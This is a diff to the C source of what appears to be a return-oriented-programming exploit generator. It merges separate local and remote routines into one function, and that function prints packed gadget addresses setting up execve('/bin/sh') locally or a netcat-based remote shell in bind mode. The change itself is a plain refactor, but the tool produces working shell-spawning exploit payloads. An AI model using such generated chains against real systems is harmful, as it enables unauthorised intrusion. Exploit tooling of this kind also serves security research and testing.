@@ -543,8 +543,9 @@ static void makepartie1_remote(t_makecode *list_ins)
   free(second_reg);
 }
 
-/* partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
-static void makepartie2_local(t_makecode *list_ins)
+/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
+/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
+static void makepartie2(t_makecode *list_ins, int local)
 {
   Elf32_Addr addr_pop_ebx;
   Elf32_Addr addr_pop_ecx;
@@ -569,49 +570,21 @@ static void makepartie2_local(t_makecode *list_ins)
   /* set %ecx */
   fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ecx, pop_ecx_gadget, ENDC);
   display_padding(how_many_pop_before(pop_ecx_gadget, "pop %ecx"));
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
+  if (local) {
+    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
+  } else {
+    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 40%s\n", BLUE, Addr_sData + 40, ENDC);
+  }
   display_padding(how_many_pop_after(pop_ecx_gadget, "pop %ecx"));
 
   /* set %edx */
   fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_edx, pop_edx_gadget, ENDC);
   display_padding(how_many_pop_before(pop_edx_gadget, "pop %edx"));
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
-  display_padding(how_many_pop_after(pop_edx_gadget, "pop %edx"));
-}
-
-/* partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
-static void makepartie2_remote(t_makecode *list_ins)
-{
-  Elf32_Addr addr_pop_ebx;
-  Elf32_Addr addr_pop_ecx;
-  Elf32_Addr addr_pop_edx;
-  char *pop_ebx_gadget;
-  char *pop_ecx_gadget;
-  char *pop_edx_gadget;
-
-  addr_pop_ebx = ret_addr_makecodefunc(list_ins, "pop %ebx");
-  addr_pop_ecx = ret_addr_makecodefunc(list_ins, "pop %ecx");
-  addr_pop_edx = ret_addr_makecodefunc(list_ins, "pop %edx");
-  pop_ebx_gadget = get_gadget_since_addr_att(addr_pop_ebx);
-  pop_ecx_gadget = get_gadget_since_addr_att(addr_pop_ecx);
-  pop_edx_gadget = get_gadget_since_addr_att(addr_pop_edx);
-
-  /* set %ebx */
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ebx, pop_ebx_gadget, ENDC);
-  display_padding(how_many_pop_before(pop_ebx_gadget, "pop %ebx"));
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data%s\n", BLUE, Addr_sData, ENDC);
-  display_padding(how_many_pop_after(pop_ebx_gadget, "pop %ebx"));
-
-  /* set %ecx */
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_ecx, pop_ecx_gadget, ENDC);
-  display_padding(how_many_pop_before(pop_ecx_gadget, "pop %ecx"));
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 40%s\n", BLUE, Addr_sData + 40, ENDC);
-  display_padding(how_many_pop_after(pop_ecx_gadget, "pop %ecx"));
-
-  /* set %edx */
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, addr_pop_edx, pop_edx_gadget, ENDC);
-  display_padding(how_many_pop_before(pop_edx_gadget, "pop %edx"));
-  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 52%s\n", BLUE, Addr_sData + 52, ENDC);
+  if (local) {
+    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 8%s\n", BLUE, Addr_sData + 8, ENDC);
+  } else {
+    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + 52%s\n", BLUE, Addr_sData + 52, ENDC);
+  }
   display_padding(how_many_pop_after(pop_edx_gadget, "pop %edx"));
 }
 
@@ -670,13 +643,12 @@ void makecode(t_makecode *list_ins)
   if (!bind_mode.flag)
     {
       makepartie1_local(list_ins);
-      makepartie2_local(list_ins);
     }
   else
     {
       makepartie1_remote(list_ins);
-      makepartie2_remote(list_ins);
     }
+  makepartie2(list_ins, !bind_mode.flag);
   makepartie3(list_ins);
   makepartie4(list_ins);
   fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
